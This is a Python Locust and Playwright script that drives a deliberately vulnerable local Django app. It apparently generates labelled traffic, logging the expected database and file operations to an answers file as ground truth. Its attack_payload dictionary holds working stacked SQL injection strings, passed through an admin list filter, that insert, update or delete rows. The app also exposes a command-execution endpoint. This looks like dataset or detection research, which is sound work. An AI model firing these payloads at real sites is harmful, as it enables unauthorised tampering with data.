from locust import HttpUser, task, between, events
from locust.clients import ResponseContextManager
from playwright.sync_api import sync_playwright
import random
import string  
from loguru import logger  
import os
from itertools import count
import json
import gevent
import time
from urllib.parse import quote


data_dir = "/usr/data/"
attack_payload = {
    "insert": "detail__a') = '1'; INSERT INTO vuln_collection(id, name, detail) VALUES (2222, 'Injected Record', '{\"title\":\"hacked title\",\"author\":\"hacker\",\"tags\":[\"pwned\"],\"content\":\"system compromised\"}'); --",
    "update": "detail__a') = '1'; UPDATE vuln_collection SET name='Hacked Record', detail='{\"title\":\"updated title\",\"author\":\"hacker\",\"tags\":[\"hacked\",\"updated\"],\"content\":\"This record has been modified\"}' WHERE id=1; --",
    "delete": "detail__a') = '1'; DELETE FROM vuln_collection WHERE id=1; --",
}

counter = count(0)  # 计数器，用于生成唯一的消息 ID
answer_file = os.path.join(os.path.dirname(__file__), "answers.json")  # 日志文件路径
answers = {}

users = [
    {
        "username": "admin",
        "password": "a123123123",
        "id": 1
    },
]
users_crt = []

@events.test_start.add_listener
def on_test_start(environment, **_kwargs):
    def get_headers(url, username, password):  
        with sync_playwright() as p:  
            browser = p.chromium.launch()
            logger.info("Browser launched")
            page = browser.new_page()  
            
            try:  
                # 访问登录页  
                page.goto(f"{url}")  
                
                # 填写并提交登录表单  
                page.fill('input[name="username"]', username)  
                page.fill('input[name="password"]', password)  
                page.click('input[type="submit"]') 
                
                logger.info("Login form submitted")
                # 等待页面加载完成  
                page.wait_for_load_state('networkidle')  
                logger.info("Page loaded")
                
                cookies = page.context.cookies()
                useragent = page.evaluate("navigator.userAgent")
                
                return cookies, useragent
            finally:  
                browser.close()
    
    # CRSF_TOKEN, COOKIES, USER_AGENT = get_pgadmin_headers("http://localhost:5050", "vulhub@example.com", "vulhub")
    for user in users:
        crt = {}
        crt["COOKIES"], crt["USER_AGENT"] = get_headers("http://localhost:8000/admin", user["username"], user["password"])
        users_crt.append(crt)
    input("Press Enter to Start the test...")  # 等待用户按下回车键


def calculate_bytes_sent(method: str, uri: str, request_headers: dict, body: str) -> int:
    """计算请求的字节数"""
    request_line = f"{method} {uri} HTTP/1.1\r\n"
    headers = "".join([f"{key}: {value}\r\n" for key, value in request_headers.items()])
    request = f"{request_line}{headers}\r\n{body}"
    return len(request)


def random_string(length: int = 15):  
    """生成随机字符串"""  
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))  


def new_log_entry(response: ResponseContextManager, extra: dict | None = None) -> dict:
    """创建新的日志条目""" 
    body = eval(response.request.body.decode("utf-8")) if response.request.body else {} 
    body = {k: str(v) for k, v in body.items()}  # 将所有值转换为字符串
    if extra:
        for key, value in extra.items():
            body[key] = str(value)  # 将所有值转换为字符串
    return {
        "verb": response.request_meta["request_type"],
        "uri": response.request_meta["name"],
        "bytes_sent": calculate_bytes_sent(
            response.request_meta["request_type"],
            response.request_meta["name"],
            response.request.headers,
            response.request.body.decode("utf-8") if response.request.body else "",
        ),
        "num_params": len(body),
        "params": body,
    }


class APIUser(HttpUser):  
    """定义用户行为"""  
    wait_time = between(2, 4)  # 每次请求之间的等待时间（1到3秒之间随机）
    
    def on_start(self):
        try:
            # 登陆获取Session
            self.user_index = random.randint(0, len(users_crt) - 1)
            COOKIES = users_crt[self.user_index]["COOKIES"]
            USER_AGENT = users_crt[self.user_index]["USER_AGENT"]

            if all([COOKIES, USER_AGENT]):
                for cookie in COOKIES:
                    self.client.cookies.set(cookie['name'], cookie['value'])
                self.client.headers["User-Agent"] = USER_AGENT
            else:
                logger.error("Failed to obtain cookies, or user agent.")
                raise Exception("Failed to obtain cookies, or user agent.")
            self.client.headers["Host"] = "localhost:8000"
            self.client.headers["Origin"] = "http://localhost:8000"

        except KeyboardInterrupt:
            logger.info("Test interrupted by user")
            raise
        except gevent.Timeout:
            logger.error("Timeout occurred")
            raise
        except Exception as e:
            gevent.sleep(1)
            self.on_start()

    # @task
    def create_message(self):
        """创建消息"""
        message = random_string()
        x_request_id = str(next(counter))
        with self.client.post(
            url="/api/messages/",
            json={"message": message},
            headers={"Host": "localhost:8000", "x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            entry = new_log_entry(response)
            if response.status_code == 201:
                db_statements = [
                    {
                        "type": "INSERT",
                        "table": "vuln_message",
                        "columns": {
                            "message": message,
                        },
                        "is_match": True
                    },
                    {
                        "type": "UPDATE",
                        "table": "vuln_message",
                        "columns": {
                            "message": message,
                            "message_id": "*"
                        },
                        "is_match": True
                    }
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "db_statements": db_statements,
                    "request_time": time.time(),
                }
                response.success()
            else:
                response.failure(f"Failed to create message: {response.text}")

    def create_message_with_id(self, message_id):
        """创建带 ID 的消息"""     
        gevent.sleep(1)  # 模拟延迟
        logger.info(f"Creating message with ID: {message_id}")
        x_request_id = str(next(counter))
        message = random_string()
        with self.client.post(
            url="/api/messages/",
            json={"message_id": message_id, "message": message},
            headers={"Host": "localhost:8000", "x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            entry = new_log_entry(response)
            if response.status_code == 201:
                # response.success()
                db_statements = [
                    {
                        "type": "INSERT",
                        "table": "vuln_message",
                        "columns": {
                            "message_id": str(message_id),
                            "message": message,
                        },
                        "is_match": True
                    },
                    {
                        "type": "UPDATE",
                        "table": "vuln_message",
                        "columns": {
                            "message": message,
                            "message_id": str(message_id)
                        },
                        "is_match": True
                    }
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "db_statements": db_statements,
                    "request_time": time.time(),
                }
                return True
            else:
                return False
                # response.failure(f"Failed to create message with ID: {response.text}")

    # @task
    def get_message(self):
        """获取消息"""
        x_request_id = str(next(counter))
        with self.client.get(
            url="/api/messages/",
            headers={"Host": "localhost:8000", "x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            entry = new_log_entry(response)
            if response.status_code == 200:
                db_statements = [
                    {
                        "type": "SELECT",
                        "table": "vuln_message",
                        "columns": {},
                        "is_match": True
                    },
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "db_statements": db_statements,
                    "request_time": time.time(),
                }
                response.success()
            else:
                response.failure(f"Failed to get messages: {response.text}")
    
    # @task
    def delete_message(self):
        """删除消息"""
        message_id = random.randint(1, 1000)  # 假设消息 ID 在 1 到 100 之间
        x_request_id = str(next(counter))
        with self.client.delete(
            url=f"/api/messages/{message_id}/",
            headers={"Host": "localhost:8000", "x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            entry = new_log_entry(response, extra={"message_id": message_id})
            db_statements = [
                # {
                #     "type": "SELECT",
                #     "table": "vuln_message",
                #     "columns": {
                #         "message_id": str(message_id),
                #     },
                #     "is_match": True
                # }
            ]
            curr_time = time.time()
            if response.status_code == 204:
                db_statements.append({
                    "type": "DELETE",
                    "table": "vuln_message",
                    "columns": {
                    "message_id": str(message_id),
                    },
                    "is_match": True
                })
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "db_statements": db_statements,
                    "request_time": curr_time,
                }
                response.success()
            else:
                if self.create_message_with_id(message_id):
                    response.success()
                else:
                    # 如果创建消息失败，则返回失败状态
                    response.failure(f"Failed to create message with ID: {message_id}")
            
    # @task
    def update_message(self):
        """更新消息"""
        message_id = random.randint(1, 1000)  # 假设消息 ID 在 1 到 100 之间
        x_request_id = str(next(counter))
        message = random_string()
        with self.client.put(
            url=f"/api/messages/{message_id}/",
            json={"message": message},
            headers={"Host": "localhost:8000", "x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            entry = new_log_entry(response, extra={"message_id": message_id})
            db_statements = [
                # {
                #     "type": "SELECT",
                #     "table": "vuln_message",
                #     "columns": {
                #         "message_id": str(message_id),
                #     },
                #     "is_match": True
                # }
            ]
            curr_time = time.time()
            if response.status_code == 200:
                db_statements.append({
                    "type": "UPDATE",
                    "table": "vuln_message",
                    "columns": {
                        "message": message,
                        "message_id": str(message_id)
                    },
                    "is_match": True
                })
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "db_statements": db_statements,
                    "request_time": curr_time,
                }
                response.success()
            else:
                # response.failure(f"Failed to update message: {response.text}")
                if self.create_message_with_id(message_id):
                    response.success()
                else:
                    # 如果创建消息失败，则返回失败状态
                    response.failure(f"Failed to create message with ID: {message_id}")
    
    # @task
    def get_message_detail(self):
        """获取消息详情"""
        message_id = random.randint(1, 1000)  # 假设消息 ID 在 1 到 100 之间
        x_request_id = str(next(counter))
        with self.client.get(
            url=f"/api/messages/{message_id}/",
            headers={"Host": "localhost:8000", "x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            entry = new_log_entry(response, extra={"message_id": message_id})
            db_statements = [
                {
                    "type": "SELECT",
                    "table": "vuln_message",
                    "columns": {
                        "message_id": str(message_id),
                    },
                    "is_match": True
                }
            ]
            curr_time = time.time()
            answers[str(x_request_id)] = {
                "http_request": entry,
                "db_statements": db_statements,
                "request_time": curr_time,
            }
            if response.status_code == 200:
                response.success()
            else:
                # response.failure(f"Failed to get message detail: {response.text}")
                if self.create_message_with_id(message_id):
                    response.success()
                else:
                    # 如果创建消息失败，则返回失败状态
                    response.failure(f"Failed to create message with ID: {message_id}")

    # @task
    def execute_command(self):
        command = random.choice(
            [
                f"echo '{random_string()}' >> /tmp/{random_string(5)}.txt",
            ],
        )
        x_request_id = str(next(counter))
        if random.choice([True, False]):
            command += f" && echo '{random_string()}' >> /tmp/{random_string(5)}.txt"
        with self.client.post(
            url="/api/execute/",
            json={"command": command},
            headers={"Host": "localhost:8000", "x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            entry = new_log_entry(response)
            fs_operations = [
                {
                    "operation": "update",
                    "source_path": "/tmp/test.txt",
                    "destination_path": None,
                    "is_directory": False,
                    "is_match": True
                },
            ]
            if "&&" in command:
                fs_operations.append(
                    {
                        "operation": "update",
                        "source_path": "/tmp/test.txt",
                        "destination_path": None,
                        "is_directory": False,
                        "is_match": True
                    }
                )
            if response.status_code == 200:
                response.success()
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
            else:
                response.failure(f"Failed to execute command: {response.text}")
    
    # @task
    def create_file(self, file_path=None):
        """创建文件"""
        if file_path is None:
            file_path = f"{random_string(10)}.txt"
        content = random_string(10)
        x_request_id = str(next(counter))
        with self.client.post(
            url="/api/create_file/",
            json={"file_path": file_path, "content": content},
            headers={"Host": "localhost:8000", "x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            entry = new_log_entry(response, extra={"file_path": file_path})
            fs_operations = [
                {
                    "operation": "create",
                    "source_path": data_dir + file_path,
                    "destination_path": None,
                    "is_directory": False,
                    "is_match": True
                },
                {
                    "operation": "update",
                    "source_path": data_dir + file_path,
                    "destination_path": None,
                    "is_directory": False,
                    "is_match": True
                }
            ]
            if response.status_code == 201:
                response.success()
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
            else:
                response.failure(f"Failed to create file: {response.text}")

    # @task
    def delete_file(self):
        """删除文件"""
        file_path = f"{random_string(10)}.txt"
        # Create the file first to ensure it exists
        self.create_file(file_path)
        gevent.sleep(2)  # 模拟延迟
        x_request_id = str(next(counter))
        with self.client.delete(
            url="/api/delete_file/",
            json={"file_path": file_path},
            headers={"Host": "localhost:8000", "x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            entry = new_log_entry(response, extra={"file_path": file_path})
            fs_operations = [
                {
                    "operation": "delete",
                    "source_path": data_dir + file_path,
                    "destination_path": None,
                    "is_directory": False,
                    "is_match": True
                }
            ]
            if response.status_code == 200:
                response.success()
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
            else:
                response.failure(f"Failed to delete file: {response.text}")

    # @task
    def modify_file(self):
        """修改文件内容"""
        file_path = f"{random_string(10)}.txt"
        new_content = random_string(10)
        # Create the file first to ensure it exists
        self.create_file(file_path)
        gevent.sleep(2)  # 模拟延迟
        x_request_id = str(next(counter))
        with self.client.put(
            url="/api/modify_file/",
            json={"file_path": file_path, "content": new_content},
            headers={"Host": "localhost:8000", "x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            entry = new_log_entry(response, extra={"file_path": file_path})
            fs_operations = [
                {
                    "operation": "update",
                    "source_path": data_dir + file_path,
                    "destination_path": None,
                    "is_directory": False,
                    "is_match": True
                },
                {
                    "operation": "update",
                    "source_path": data_dir + file_path,
                    "destination_path": None,
                    "is_directory": False,
                    "is_match": True
                }
            ]
            if response.status_code == 200:
                response.success()
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
            else:
                response.failure(f"Failed to modify file: {response.text}")

    # @task
    def move_file(self):
        """移动文件"""
        source_path = f"{random_string(10)}.txt"
        destination_path = f"{random_string(10)}.txt"
        # Create the file first to ensure it exists
        self.create_file(source_path)
        gevent.sleep(2)  # 模拟延迟
        x_request_id = str(next(counter))
        with self.client.post(
            url="/api/move_file/",
            json={"source_path": source_path, "destination_path": destination_path},
            headers={"Host": "localhost:8000", "x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            entry = new_log_entry(response, extra={"source_path": source_path, "destination_path": destination_path})
            fs_operations = [
                {
                    "operation": "move",
                    "source_path": data_dir + source_path,
                    "destination_path": data_dir + destination_path,
                    "is_directory": False,
                    "is_match": True
                }
            ]
            if response.status_code == 200:
                response.success()
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
            else:
                response.failure(f"Failed to move file: {response.text}")

    @task
    def attack(self):
        x_request_id = str(next(counter))
        attack_type = random.choice(list(attack_payload.keys()))
        payload = attack_payload[attack_type]
        payload_id = str(random.randint(1, 10000000))
        if attack_type == "insert":
            payload = payload.replace("2222", payload_id)
        if attack_type == "update":
            payload = payload.replace("1", payload_id)
        if attack_type == "delete":
            payload = payload.replace("1", payload_id)
        with self.client.get(
            f"/admin/vuln/collection/?{quote(payload)}",
            headers={"Host": "localhost:8000", "x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            entry = new_log_entry(response, extra={"param0": payload})
            if response.status_code == 500 and "no results to fetch" in response.text:
                response.success()
                db_statements = []
                if attack_type == "delete":
                    db_statements= [
                        {
                            "type": "DELETE",
                            "table": "vuln_collection",
                            "columns": {
                                "id": payload_id,
                            },
                            "is_match": True
                        },
                        {
                            "type": "DELETE",
                            "table": "vuln_collection",
                            "columns": {
                                "id": payload_id,
                            },
                            "is_match": True
                        },
                        {
                            "type": "DELETE",
                            "table": "vuln_collection",
                            "columns": {
                                "id": payload_id,
                            },
                            "is_match": True
                        },
                    ]
                if attack_type == "update":
                    db_statements= [
                        {
                            "type": "UPDATE",
                            "table": "vuln_collection",
                            "columns": {
                                "name": "Hacked Record",
                                "detail": "{\"title\":\"updated title\",\"author\":\"hacker\",\"tags\":[\"hacked\",\"updated\"],\"content\":\"This record has been modified\"}",
                                "id": payload_id
                            },
                            "is_match": True
                        },
                        {
                            "type": "UPDATE",
                            "table": "vuln_collection",
                            "columns": {
                                "name": "Hacked Record",
                                "detail": "{\"title\":\"updated title\",\"author\":\"hacker\",\"tags\":[\"hacked\",\"updated\"],\"content\":\"This record has been modified\"}",
                                "id": payload_id
                            },
                            "is_match": True
                        },
                        {
                            "type": "UPDATE",
                            "table": "vuln_collection",
                            "columns": {
                                "name": "Hacked Record",
                                "detail": "{\"title\":\"updated title\",\"author\":\"hacker\",\"tags\":[\"hacked\",\"updated\"],\"content\":\"This record has been modified\"}",
                                "id": payload_id
                            },
                            "is_match": True
                        },
                    ]
                if attack_type == "insert":
                    db_statements= [
                        {
                            "type": "INSERT",
                            "table": "vuln_collection",
                            "columns": {
                                "id": payload_id,
                                "name": "Injected Record",
                                "detail": "{\"title\":\"hacked title\",\"author\":\"hacker\",\"tags\":[\"pwned\"],\"content\":\"system compromised\"}"
                            },
                            "is_match": True
                        },
                        {
                            "type": "INSERT",
                            "table": "vuln_collection",
                            "columns": {
                                "id": payload_id,
                                "name": "Injected Record",
                                "detail": "{\"title\":\"hacked title\",\"author\":\"hacker\",\"tags\":[\"pwned\"],\"content\":\"system compromised\"}"
                            },
                            "is_match": True
                        },
                        {
                            "type": "INSERT",
                            "table": "vuln_collection",
                            "columns": {
                                "id": payload_id,
                                "name": "Injected Record",
                                "detail": "{\"title\":\"hacked title\",\"author\":\"hacker\",\"tags\":[\"pwned\"],\"content\":\"system compromised\"}"
                            },
                            "is_match": True
                        },
                    ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "db_statements": db_statements,
                    "request_time": time.time(),
                }
            else:
                response.failure(f"Failed to execute attack")


@events.test_stop.add_listener
def on_test_stop(environment, **_kwargs):
    # 将答案写入文件
    with open(answer_file, "w") as f:
        json.dump(answers, f, indent=4)
    logger.info(f"Answers written to {answer_file}")